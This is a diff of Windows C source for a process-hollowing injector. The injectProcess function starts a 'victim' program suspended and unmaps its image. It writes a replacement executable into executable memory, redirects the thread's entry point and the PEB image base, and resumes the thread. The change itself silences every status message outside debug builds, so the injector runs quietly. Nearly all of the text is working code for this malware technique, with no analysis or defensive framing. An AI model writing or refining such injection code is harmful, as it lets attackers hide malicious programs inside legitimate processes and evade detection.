@@ -15,6 +15,13 @@ EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
 EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
 EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);
 
+#ifdef _DEBUG
+#define debug_print(fmt, ...) \
+            do { fprintf(stderr, fmt, __VA_ARGS__); } while (0)
+#else
+#define debug_print(fmt, ...) 
+#endif
+
 int injectProcess(wchar_t* aVictimProc, wchar_t* aInjectedProc)
 {
 
@@ -40,23 +47,23 @@ int injectProcess(wchar_t* aVictimProc, wchar_t* aInjectedProc)
 	memset(&si, 0, sizeof(si));
 	memset(&pi, 0, sizeof(pi));
 
-	printf("\nRunning the target executable.\n");
+	debug_print("\nRunning the target executable.\n");
 
 	if (!CreateProcessW(NULL, aVictimProc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Start the target application
 	{
-		printf("\nError: Unable to run the target executable. CreateProcess failed with error %d\n", GetLastError());
+		debug_print("\nError: Unable to run the target executable. CreateProcess failed with error %d\n", GetLastError());
 		return 1;
 	}
 
-	printf("\nProcess created in suspended state.\n");
+	debug_print("\nProcess created in suspended state.\n");
 
-	printf("\nOpening the replacement executable.\n");
+	debug_print("\nOpening the replacement executable.\n");
 
 	hFile = CreateFileW(aInjectedProc, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); // Open the replacement executable
 
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		printf("\nError: Unable to open the replacement executable. CreateFile failed with error %d\n", GetLastError());
+		debug_print("\nError: Unable to open the replacement executable. CreateFile failed with error %d\n", GetLastError());
 
 		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
 		return 1;
@@ -68,7 +75,7 @@ int injectProcess(wchar_t* aVictimProc, wchar_t* aInjectedProc)
 
 	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) // Read the executable file from disk
 	{
-		printf("\nError: Unable to read the replacement executable. ReadFile failed with error %d\n", GetLastError());
+		debug_print("\nError: Unable to read the replacement executable. ReadFile failed with error %d\n", GetLastError());
 
 		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
 		return 1;
@@ -80,7 +87,7 @@ int injectProcess(wchar_t* aVictimProc, wchar_t* aInjectedProc)
 
 	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
 	{
-		printf("\nError: Invalid executable format.\n");
+		debug_print("\nError: Invalid executable format.\n");
 		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
 		return 1;
 	}
@@ -98,25 +105,25 @@ int injectProcess(wchar_t* aVictimProc, wchar_t* aInjectedProc)
 #endif
 	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
 	{
-		printf("\nUnmapping original executable image from child process. Address: %#zx\n", (SIZE_T)base);
+		debug_print("\nUnmapping original executable image from child process. Address: %#zx\n", (SIZE_T)base);
 		NtUnmapViewOfSection(pi.hProcess, base); // Unmap the executable image using NtUnmapViewOfSection function
 	}
 
-	printf("\nAllocating memory in child process.\n");
+	debug_print("\nAllocating memory in child process.\n");
 
 	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory for the executable image
 
 	if (!mem)
 	{
-		printf("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());
+		debug_print("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());
 
 		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
 		return 1;
 	}
 
-	printf("\nMemory allocated. Address: %#zx\n", (SIZE_T)mem);
+	debug_print("\nMemory allocated. Address: %#zx\n", (SIZE_T)mem);
 
-	printf("\nWriting executable image into child process.\n");
+	debug_print("\nWriting executable image into child process.\n");
 
 	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL); // Write the header of the replacement executable into child process
 
@@ -130,7 +137,7 @@ int injectProcess(wchar_t* aVictimProc, wchar_t* aInjectedProc)
 #ifdef _WIN64
 	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image
 
-	printf("\nNew entry point: %#zx\n", ctx.Rcx);
+	debug_print("\nNew entry point: %#zx\n", ctx.Rcx);
 
 	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T)*2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
 #endif
@@ -138,27 +145,27 @@ int injectProcess(wchar_t* aVictimProc, wchar_t* aInjectedProc)
 #ifdef _X86_
 	ctx.Eax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image
 
-	printf("\nNew entry point: %#zx\n", ctx.Eax);
+	debug_print("\nNew entry point: %#zx\n", ctx.Eax);
 
 	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
 #endif
 	
 
-	printf("\nSetting the context of the child process's primary thread.\n");
+	debug_print("\nSetting the context of the child process's primary thread.\n");
 
 	NtSetContextThread(pi.hThread, &ctx); // Set the thread context of the child process's primary thread
 
-	printf("\nResuming child process's primary thread.\n");
+	debug_print("\nResuming child process's primary thread.\n");
 
 	NtResumeThread(pi.hThread, NULL); // Resume the primary thread
 
-	printf("\nThread resumed.\n");
+	debug_print("\nThread resumed.\n");
 
-	printf("\nWaiting for child process to terminate.\n");
+	debug_print("\nWaiting for child process to terminate.\n");
 
 	NtWaitForSingleObject(pi.hProcess, FALSE, NULL); // Wait for the child process to terminate
 
-	printf("\nProcess terminated.\n");
+	debug_print("\nProcess terminated.\n");
 
 	NtClose(pi.hThread); // Close the thread handle
 	NtClose(pi.hProcess); // Close the process handle
